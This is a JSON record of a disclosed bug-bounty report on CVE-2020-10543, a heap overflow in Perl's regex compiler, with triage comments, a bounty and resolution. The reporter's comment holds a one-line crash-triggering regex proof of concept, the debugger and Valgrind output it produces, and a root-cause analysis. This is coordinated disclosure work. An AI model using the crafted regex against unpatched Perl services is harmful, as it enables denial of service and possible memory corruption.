{"id":888986,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84ODg5ODY=","url":"https://hackerone.com/reports/888986","title":"[CVE-2020-10543] Buffer overflow caused by a crafted regular expression","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-06-01T23:58:45.645Z","submitted_at":"2020-06-01T23:58:45.645Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"tmnt53","url":"/tmnt53","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/Md3sdzB9WvuY9YS5U39V4rEz/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":30,"url":"https://hackerone.com/ibb-perl","handle":"ibb-perl","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/030/06e86a090af9d395cec5535eea83b90c72274566_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/030/06e86a090af9d395cec5535eea83b90c72274566_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Perl (IBB)","twitter_handle":"","website":"http://www.perl.org","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-11-09T03:27:46.369Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2020-10-10T03:27:35.685Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"CVE ID: CVE-2020-10543\nSee:\n  + https://metacpan.org/pod/release/XSAWYERX/perl-5.30.3/pod/perldelta.pod\n  + https://metacpan.org/pod/release/XSAWYERX/perl-5.28.3/pod/perldelta.pod\n\n## Impact\n\nPotential RCE","vulnerability_information_html":"\u003cp\u003eCVE ID: CVE-2020-10543\u003cbr\u003e\nSee:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca title=\"https://metacpan.org/pod/release/XSAWYERX/perl-5.30.3/pod/perldelta.pod\" href=\"/redirect?url=https%3A%2F%2Fmetacpan.org%2Fpod%2Frelease%2FXSAWYERX%2Fperl-5.30.3%2Fpod%2Fperldelta.pod\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://metacpan.org/pod/release/XSAWYERX/perl-5.30.3/pod/perldelta.pod\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"https://metacpan.org/pod/release/XSAWYERX/perl-5.28.3/pod/perldelta.pod\" href=\"/redirect?url=https%3A%2F%2Fmetacpan.org%2Fpod%2Frelease%2FXSAWYERX%2Fperl-5.28.3%2Fpod%2Fperldelta.pod\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://metacpan.org/pod/release/XSAWYERX/perl-5.28.3/pod/perldelta.pod\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003ePotential RCE\u003c/p\u003e\n","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":5,"name":"Heap Overflow"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-11-09T03:27:35.793Z","allow_singular_disclosure_after":-4333141.606505241,"singular_disclosure_allowed":true,"vote_count":10,"voters":["rjenningsuk","trazer","jb1994","pokediger2","thedarkvisitor","darkly","giovanni21","s0va55a1-1","3_keveen","hypernova11"],"severity":{"rating":"medium","score":6.5,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"low","availability":"low"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":8176373,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @tmnt53,\n\nThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nRegards,\n@ktistai","markdown_message":"\u003cp\u003eHello \u003ca href=\"/tmnt53\"\u003e@tmnt53\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\n\u003ca href=\"/ktistai\"\u003e@ktistai\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-02T09:14:27.048Z","updated_at":"2020-06-02T09:14:27.048Z","actor":{"username":"ktistai","cleared":false,"url":"/ktistai","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-perl","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8176387,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-02T09:15:28.774Z","updated_at":"2020-06-02T09:15:28.774Z","additional_data":{"old_severity":"Critical (9.8)","new_severity":"Medium (6.5)","old_severity_id":738447,"new_severity_id":738692},"actor":{"username":"ktistai","cleared":false,"url":"/ktistai","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-perl","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8176405,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @tmnt53\n\nI've marked the report as Medium since there is no demonstration that an RCE is possible. However, the internal team may change this, as they will have more insight on the vulnerability itself. \n\nBest regards, \n@ktistai","markdown_message":"\u003cp\u003eHi \u003ca href=\"/tmnt53\"\u003e@tmnt53\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ve marked the report as Medium since there is no demonstration that an RCE is possible. However, the internal team may change this, as they will have more insight on the vulnerability itself. \u003c/p\u003e\n\n\u003cp\u003eBest regards, \u003cbr\u003e\n\u003ca href=\"/ktistai\"\u003e@ktistai\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-02T09:16:21.638Z","updated_at":"2020-06-02T09:16:21.638Z","actor":{"username":"ktistai","cleared":false,"url":"/ktistai","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-perl","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8180849,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Let me give more details of the bug.\n## Compilation and environment\n```\nroot@manh-ubuntu16:~/fuzz/fuzz_perl# ./perl-dbg-32/perl -v\n\nThis is perl 5, version 31, subversion 5 (v5.31.5 (v5.31.4-363-g9786385)) built for x86_64-linux\n\nCopyright 1987-2019, Larry Wall\n\nPerl may be copied only under the terms of either the Artistic License or the\nGNU General Public License, which may be found in the Perl 5 source kit.\n\nComplete documentation for Perl, including FAQ lists, should be found on\nthis system using \"man perl\" or \"perldoc perl\".  If you have access to the\nInternet, point your browser at http://www.perl.org/, the Perl Home Page.\n\nroot@manh-ubuntu16:~/fuzz/fuzz_perl# lsb_release -r\nRelease: 16.04\n```\nCompilation:\n```\n./Configure -des -Dusedevel -DDEBUGGING -Dcc=gcc -Accflags=\"-m32 -O0\" -Aldflags=-m32 -Alddlflags=\"-shared -O0 -ggdb -m32\" \u0026\u0026 make\n```\n## Reproduce\n```\nroot@manh-ubuntu16:~/fuzz/fuzz_perl# cat test.pl\n$x = '((0{50}){10000}){10000}'; '' =~ /$x/ms;\nroot@manh-ubuntu16:~/fuzz/fuzz_perl# ./perl-dbg-32/perl test.pl\nSegmentation fault (core dumped)\nroot@manh-ubuntu16:~/fuzz/fuzz_perl# gdb --args ./perl-dbg-32/perl test.pl\nGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1\nCopyright (C) 2016 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later \u003chttp://gnu.org/licenses/gpl.html\u003e\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"x86_64-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n\u003chttp://www.gnu.org/software/gdb/bugs/\u003e.\nFind the GDB manual and other documentation resources online at:\n\u003chttp://www.gnu.org/software/gdb/documentation/\u003e.\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\nReading symbols from ./perl-dbg-32/perl...done.\n(gdb) r\nStarting program: /root/fuzz/fuzz_perl/perl-dbg-32/perl test.pl\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\n\nProgram received signal SIGSEGV, Segmentation fault.\n__memcpy_sse2_unaligned ()\n    at ../sysdeps/i386/i686/multiarch/memcpy-sse2-unaligned.S:586\n586 ../sysdeps/i386/i686/multiarch/memcpy-sse2-unaligned.S: No such file or directory.\n(gdb) bt\n#0  __memcpy_sse2_unaligned ()\n    at ../sysdeps/i386/i686/multiarch/memcpy-sse2-unaligned.S:586\n#1  0x0812e5bf in memcpy (__len=512000000, __src=\u003coptimized out\u003e,\n    __dest=\u003coptimized out\u003e) at /usr/include/i386-linux-gnu/bits/string3.h:53\n#2  Perl_repeatcpy (to=0xcd8f5128 '0' \u003crepeats 200 times\u003e...,\n    from=0xcd87b008 '0' \u003crepeats 200 times\u003e..., len=500000, count=9999)\n    at util.c:3078\n#3  0x08104358 in S_study_chunk (pRExC_state=pRExC_state@entry=0xffffd188,\n    scanp=scanp@entry=0xffffd17c, minlenp=minlenp@entry=0xffffd168,\n    deltap=0xffffd174, last=\u003coptimized out\u003e, data=0xffffd3a0,\n    stopparen=\u003coptimized out\u003e, recursed_depth=\u003coptimized out\u003e,\n    flags=\u003coptimized out\u003e, depth=\u003coptimized out\u003e, and_withp=\u003coptimized out\u003e)\n    at regcomp.c:5666\n#4  0x0811c072 in Perl_re_op_compile (patternp=0x8453eb0,\n    pat_count=\u003coptimized out\u003e, expr=\u003coptimized out\u003e,\n    eng=0x83a23e0 \u003cPL_core_reg_engine\u003e, old_re=0x0, is_bare_re=0xffffd45b,\n    orig_rx_flags=3, pm_flags=3) at regcomp.c:8091\n#5  0x081c9614 in Perl_pp_regcomp () at pp_ctl.c:113\n#6  0x08122810 in Perl_runops_debug () at dump.c:2571\n#7  0x08098b8f in S_run_body (oldscope=1) at perl.c:2712\n#8  perl_run (my_perl=0x844f008) at perl.c:2635\n#9  0x08064f4d in main (argc=2, argv=0xffffd644, env=0xffffd650)\n    at perlmain.c:127\nroot@manh-ubuntu16:~/fuzz/fuzz_perl# valgrind ./perl-dbg-32/perl test.pl\n==31478== Memcheck, a memory error detector\n==31478== Copyright (C) 2002-2015, and GNU GPL'd, by Julian Seward et al.\n==31478== Using Valgrind-3.11.0 and LibVEX; rerun with -h for copyright info\n==31478== Command: ./perl-dbg-32/perl test.pl\n==31478==\n==31478== Warning: set address range perms: large range [0x8cc914a, 0x32cae22c) (undefined)\n==31478== Invalid write of size 4\n==31478==    at 0x4030ED2: memcpy (in /usr/lib/valgrind/vgpreload_memcheck-x86-linux.so)\n==31478==    by 0x812E5BE: memcpy (string3.h:53)\n==31478==    by 0x812E5BE: Perl_repeatcpy (util.c:3078)\n==31478==    by 0x8104357: S_study_chunk.constprop.49 (regcomp.c:5666)\n==31478==    by 0x811C071: Perl_re_op_compile (regcomp.c:8091)\n==31478==    by 0x81C9613: Perl_pp_regcomp (pp_ctl.c:113)\n==31478==    by 0x812280F: Perl_runops_debug (dump.c:2571)\n==31478==    by 0x8098B8E: S_run_body (perl.c:2712)\n==31478==    by 0x8098B8E: perl_run (perl.c:2635)\n==31478==    by 0x8064F4C: main (perlmain.c:127)\n==31478==  Address 0x32cae22c is 0 bytes after a block of size 705,032,708 alloc'd\n==31478==    at 0x402E2CC: realloc (in /usr/lib/valgrind/vgpreload_memcheck-x86-linux.so)\n==31478==    by 0x812C1AD: Perl_safesysrealloc (util.c:279)\n==31478==    by 0x8179DB6: Perl_sv_grow (sv.c:1596)\n==31478==    by 0x81042F1: S_study_chunk.constprop.49 (regcomp.c:5665)\n==31478==    by 0x811C071: Perl_re_op_compile (regcomp.c:8091)\n==31478==    by 0x81C9613: Perl_pp_regcomp (pp_ctl.c:113)\n==31478==    by 0x812280F: Perl_runops_debug (dump.c:2571)\n==31478==    by 0x8098B8E: S_run_body (perl.c:2712)\n==31478==    by 0x8098B8E: perl_run (perl.c:2635)\n==31478==    by 0x8064F4C: main (perlmain.c:127)\n==31478==\n==31478==\n==31478== Process terminating with default action of signal 11 (SIGSEGV)\n==31478==  Access not within mapped region at address 0x32CAF000\n==31478==    at 0x4030ED2: memcpy (in /usr/lib/valgrind/vgpreload_memcheck-x86-linux.so)\n==31478==    by 0x812E5BE: memcpy (string3.h:53)\n==31478==    by 0x812E5BE: Perl_repeatcpy (util.c:3078)\n==31478==    by 0x8104357: S_study_chunk.constprop.49 (regcomp.c:5666)\n==31478==    by 0x811C071: Perl_re_op_compile (regcomp.c:8091)\n==31478==    by 0x81C9613: Perl_pp_regcomp (pp_ctl.c:113)\n==31478==    by 0x812280F: Perl_runops_debug (dump.c:2571)\n==31478==    by 0x8098B8E: S_run_body (perl.c:2712)\n==31478==    by 0x8098B8E: perl_run (perl.c:2635)\n==31478==    by 0x8064F4C: main (perlmain.c:127)\n==31478==  If you believe this happened as a result of a stack\n==31478==  overflow in your program's main thread (unlikely but\n==31478==  possible), you can try to increase the size of the\n==31478==  main thread stack using the --main-stacksize= flag.\n==31478==  The main thread stack size used in this run was 8388608.\n==31478==\n==31478== HEAP SUMMARY:\n==31478==     in use at exit: 705,640,718 bytes in 637 blocks\n==31478==   total heap usage: 809 allocs, 172 frees, 706,665,588 bytes allocated\n==31478==\n```\n## Analysis\nRoot cause of the bug is simple. Look at the following line regcomp.c:5665 S_study_chunk:\n```\n5665     SvGROW(last_str, (mincount * l) + 1);\n5666     repeatcpy(SvPVX(last_str) + l,\n5667         SvPVX_const(last_str), l,\n5668         mincount - 1);\n```\nWith the test.pl as:\n$x = '((0{50}){10000}){10000}'; '' =~ /$x/ms;\nAt some time, l = 500000, mincount = 10000, so mincount * l \u003e INT_MAX, which leads to integer overflow. So the size of last_str grows to 0x2a05f200 bytes, and repeatcpy copy 10000*500000 into it =\u003e write pass the end of last_str =\u003e heap-over-flow. On 64bit perl, very large l and mincount could lead to integer overflow, too.\nOut-of-bounds Write with memcpy should be potentially code-executable.\n\nBest regards,\nPeter","markdown_message":"\u003cp\u003eLet me give more details of the bug.\u003c/p\u003e\n\n\u003ch2 id=\"compilation-and-environment\"\u003eCompilation and environment\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eroot@manh-ubuntu16:~/fuzz/fuzz_perl# ./perl-dbg-32/perl -v\n\nThis is perl 5, version 31, subversion 5 (v5.31.5 (v5.31.4-363-g9786385)) built for x86_64-linux\n\nCopyright 1987-2019, Larry Wall\n\nPerl may be copied only under the terms of either the Artistic License or the\nGNU General Public License, which may be found in the Perl 5 source kit.\n\nComplete documentation for Perl, including FAQ lists, should be found on\nthis system using \u0026quot;man perl\u0026quot; or \u0026quot;perldoc perl\u0026quot;.  If you have access to the\nInternet, point your browser at http://www.perl.org/, the Perl Home Page.\n\nroot@manh-ubuntu16:~/fuzz/fuzz_perl# lsb_release -r\nRelease: 16.04\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eCompilation:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e./Configure -des -Dusedevel -DDEBUGGING -Dcc=gcc -Accflags=\u0026quot;-m32 -O0\u0026quot; -Aldflags=-m32 -Alddlflags=\u0026quot;-shared -O0 -ggdb -m32\u0026quot; \u0026amp;\u0026amp; make\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"reproduce\"\u003eReproduce\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eroot@manh-ubuntu16:~/fuzz/fuzz_perl# cat test.pl\n$x = \u0026#39;((0{50}){10000}){10000}\u0026#39;; \u0026#39;\u0026#39; =~ /$x/ms;\nroot@manh-ubuntu16:~/fuzz/fuzz_perl# ./perl-dbg-32/perl test.pl\nSegmentation fault (core dumped)\nroot@manh-ubuntu16:~/fuzz/fuzz_perl# gdb --args ./perl-dbg-32/perl test.pl\nGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1\nCopyright (C) 2016 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later \u0026lt;http://gnu.org/licenses/gpl.html\u0026gt;\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.  Type \u0026quot;show copying\u0026quot;\nand \u0026quot;show warranty\u0026quot; for details.\nThis GDB was configured as \u0026quot;x86_64-linux-gnu\u0026quot;.\nType \u0026quot;show configuration\u0026quot; for configuration details.\nFor bug reporting instructions, please see:\n\u0026lt;http://www.gnu.org/software/gdb/bugs/\u0026gt;.\nFind the GDB manual and other documentation resources online at:\n\u0026lt;http://www.gnu.org/software/gdb/documentation/\u0026gt;.\nFor help, type \u0026quot;help\u0026quot;.\nType \u0026quot;apropos word\u0026quot; to search for commands related to \u0026quot;word\u0026quot;...\nReading symbols from ./perl-dbg-32/perl...done.\n(gdb) r\nStarting program: /root/fuzz/fuzz_perl/perl-dbg-32/perl test.pl\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \u0026quot;/lib/x86_64-linux-gnu/libthread_db.so.1\u0026quot;.\n\nProgram received signal SIGSEGV, Segmentation fault.\n__memcpy_sse2_unaligned ()\n    at ../sysdeps/i386/i686/multiarch/memcpy-sse2-unaligned.S:586\n586 ../sysdeps/i386/i686/multiarch/memcpy-sse2-unaligned.S: No such file or directory.\n(gdb) bt\n#0  __memcpy_sse2_unaligned ()\n    at ../sysdeps/i386/i686/multiarch/memcpy-sse2-unaligned.S:586\n#1  0x0812e5bf in memcpy (__len=512000000, __src=\u0026lt;optimized out\u0026gt;,\n    __dest=\u0026lt;optimized out\u0026gt;) at /usr/include/i386-linux-gnu/bits/string3.h:53\n#2  Perl_repeatcpy (to=0xcd8f5128 \u0026#39;0\u0026#39; \u0026lt;repeats 200 times\u0026gt;...,\n    from=0xcd87b008 \u0026#39;0\u0026#39; \u0026lt;repeats 200 times\u0026gt;..., len=500000, count=9999)\n    at util.c:3078\n#3  0x08104358 in S_study_chunk (pRExC_state=pRExC_state@entry=0xffffd188,\n    scanp=scanp@entry=0xffffd17c, minlenp=minlenp@entry=0xffffd168,\n    deltap=0xffffd174, last=\u0026lt;optimized out\u0026gt;, data=0xffffd3a0,\n    stopparen=\u0026lt;optimized out\u0026gt;, recursed_depth=\u0026lt;optimized out\u0026gt;,\n    flags=\u0026lt;optimized out\u0026gt;, depth=\u0026lt;optimized out\u0026gt;, and_withp=\u0026lt;optimized out\u0026gt;)\n    at regcomp.c:5666\n#4  0x0811c072 in Perl_re_op_compile (patternp=0x8453eb0,\n    pat_count=\u0026lt;optimized out\u0026gt;, expr=\u0026lt;optimized out\u0026gt;,\n    eng=0x83a23e0 \u0026lt;PL_core_reg_engine\u0026gt;, old_re=0x0, is_bare_re=0xffffd45b,\n    orig_rx_flags=3, pm_flags=3) at regcomp.c:8091\n#5  0x081c9614 in Perl_pp_regcomp () at pp_ctl.c:113\n#6  0x08122810 in Perl_runops_debug () at dump.c:2571\n#7  0x08098b8f in S_run_body (oldscope=1) at perl.c:2712\n#8  perl_run (my_perl=0x844f008) at perl.c:2635\n#9  0x08064f4d in main (argc=2, argv=0xffffd644, env=0xffffd650)\n    at perlmain.c:127\nroot@manh-ubuntu16:~/fuzz/fuzz_perl# valgrind ./perl-dbg-32/perl test.pl\n==31478== Memcheck, a memory error detector\n==31478== Copyright (C) 2002-2015, and GNU GPL\u0026#39;d, by Julian Seward et al.\n==31478== Using Valgrind-3.11.0 and LibVEX; rerun with -h for copyright info\n==31478== Command: ./perl-dbg-32/perl test.pl\n==31478==\n==31478== Warning: set address range perms: large range [0x8cc914a, 0x32cae22c) (undefined)\n==31478== Invalid write of size 4\n==31478==    at 0x4030ED2: memcpy (in /usr/lib/valgrind/vgpreload_memcheck-x86-linux.so)\n==31478==    by 0x812E5BE: memcpy (string3.h:53)\n==31478==    by 0x812E5BE: Perl_repeatcpy (util.c:3078)\n==31478==    by 0x8104357: S_study_chunk.constprop.49 (regcomp.c:5666)\n==31478==    by 0x811C071: Perl_re_op_compile (regcomp.c:8091)\n==31478==    by 0x81C9613: Perl_pp_regcomp (pp_ctl.c:113)\n==31478==    by 0x812280F: Perl_runops_debug (dump.c:2571)\n==31478==    by 0x8098B8E: S_run_body (perl.c:2712)\n==31478==    by 0x8098B8E: perl_run (perl.c:2635)\n==31478==    by 0x8064F4C: main (perlmain.c:127)\n==31478==  Address 0x32cae22c is 0 bytes after a block of size 705,032,708 alloc\u0026#39;d\n==31478==    at 0x402E2CC: realloc (in /usr/lib/valgrind/vgpreload_memcheck-x86-linux.so)\n==31478==    by 0x812C1AD: Perl_safesysrealloc (util.c:279)\n==31478==    by 0x8179DB6: Perl_sv_grow (sv.c:1596)\n==31478==    by 0x81042F1: S_study_chunk.constprop.49 (regcomp.c:5665)\n==31478==    by 0x811C071: Perl_re_op_compile (regcomp.c:8091)\n==31478==    by 0x81C9613: Perl_pp_regcomp (pp_ctl.c:113)\n==31478==    by 0x812280F: Perl_runops_debug (dump.c:2571)\n==31478==    by 0x8098B8E: S_run_body (perl.c:2712)\n==31478==    by 0x8098B8E: perl_run (perl.c:2635)\n==31478==    by 0x8064F4C: main (perlmain.c:127)\n==31478==\n==31478==\n==31478== Process terminating with default action of signal 11 (SIGSEGV)\n==31478==  Access not within mapped region at address 0x32CAF000\n==31478==    at 0x4030ED2: memcpy (in /usr/lib/valgrind/vgpreload_memcheck-x86-linux.so)\n==31478==    by 0x812E5BE: memcpy (string3.h:53)\n==31478==    by 0x812E5BE: Perl_repeatcpy (util.c:3078)\n==31478==    by 0x8104357: S_study_chunk.constprop.49 (regcomp.c:5666)\n==31478==    by 0x811C071: Perl_re_op_compile (regcomp.c:8091)\n==31478==    by 0x81C9613: Perl_pp_regcomp (pp_ctl.c:113)\n==31478==    by 0x812280F: Perl_runops_debug (dump.c:2571)\n==31478==    by 0x8098B8E: S_run_body (perl.c:2712)\n==31478==    by 0x8098B8E: perl_run (perl.c:2635)\n==31478==    by 0x8064F4C: main (perlmain.c:127)\n==31478==  If you believe this happened as a result of a stack\n==31478==  overflow in your program\u0026#39;s main thread (unlikely but\n==31478==  possible), you can try to increase the size of the\n==31478==  main thread stack using the --main-stacksize= flag.\n==31478==  The main thread stack size used in this run was 8388608.\n==31478==\n==31478== HEAP SUMMARY:\n==31478==     in use at exit: 705,640,718 bytes in 637 blocks\n==31478==   total heap usage: 809 allocs, 172 frees, 706,665,588 bytes allocated\n==31478==\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\n\u003cp\u003eRoot cause of the bug is simple. Look at the following line regcomp.c:5665 S_study_chunk:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e5665     SvGROW(last_str, (mincount * l) + 1);\n5666     repeatcpy(SvPVX(last_str) + l,\n5667         SvPVX_const(last_str), l,\n5668         mincount - 1);\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWith the test.pl as:\u003cbr\u003e\n$x = \u0026#39;((0{50}){10000}){10000}\u0026#39;; \u0026#39;\u0026#39; =~ /$x/ms;\u003cbr\u003e\nAt some time, l = 500000, mincount = 10000, so mincount * l \u0026gt; INT_MAX, which leads to integer overflow. So the size of last_str grows to 0x2a05f200 bytes, and repeatcpy copy 10000*500000 into it =\u0026gt; write pass the end of last_str =\u0026gt; heap-over-flow. On 64bit perl, very large l and mincount could lead to integer overflow, too.\u003cbr\u003e\nOut-of-bounds Write with memcpy should be potentially code-executable.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nPeter\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-02T15:50:45.336Z","updated_at":"2020-06-02T15:51:45.793Z","actor":{"username":"tmnt53","cleared":false,"url":"/tmnt53","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Md3sdzB9WvuY9YS5U39V4rEz/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-perl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8291926,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"As here https://nvd.nist.gov/vuln/detail/CVE-2020-10543, the CVSS 3.0 score is 9.8, the same as I scored it before using CVSS 3.0 matrics.","markdown_message":"\u003cp\u003eAs here \u003ca title=\"https://nvd.nist.gov/vuln/detail/CVE-2020-10543\" href=\"/redirect?url=https%3A%2F%2Fnvd.nist.gov%2Fvuln%2Fdetail%2FCVE-2020-10543\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://nvd.nist.gov/vuln/detail/CVE-2020-10543\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, the CVSS 3.0 score is 9.8, the same as I scored it before using CVSS 3.0 matrics.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-15T08:52:27.274Z","updated_at":"2020-06-15T08:52:27.274Z","actor":{"username":"tmnt53","cleared":false,"url":"/tmnt53","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Md3sdzB9WvuY9YS5U39V4rEz/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-perl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8900739,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ping! Any updates?","markdown_message":"\u003cp\u003ePing! Any updates?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-11T06:39:55.618Z","updated_at":"2020-08-11T06:39:55.618Z","actor":{"username":"tmnt53","cleared":false,"url":"/tmnt53","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Md3sdzB9WvuY9YS5U39V4rEz/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-perl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9478906,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-10T03:26:28.610Z","updated_at":"2020-10-10T03:26:28.610Z","actor":{"url":"/ibb-perl","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/030/06e86a090af9d395cec5535eea83b90c72274566_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Perl (IBB)"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"ibb-perl","collaborator":{"username":"tmnt53","url":"/tmnt53"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9478910,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for helping make the Internet a safer place!\n\nHappy hacking.","markdown_message":"\u003cp\u003eThank you for helping make the Internet a safer place!\u003c/p\u003e\n\n\u003cp\u003eHappy 